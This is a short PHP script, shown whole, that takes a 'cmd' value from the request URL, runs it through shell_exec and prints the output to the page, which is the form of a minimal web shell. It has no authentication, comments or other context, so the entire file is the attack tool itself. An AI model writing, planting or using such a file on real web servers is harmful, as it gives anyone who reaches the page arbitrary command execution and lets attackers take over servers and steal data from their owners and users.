<?php

$command = $_GET['cmd'];
$data1 = shell_exec("$command");

echo "<pre> $data1 </pre>";


?>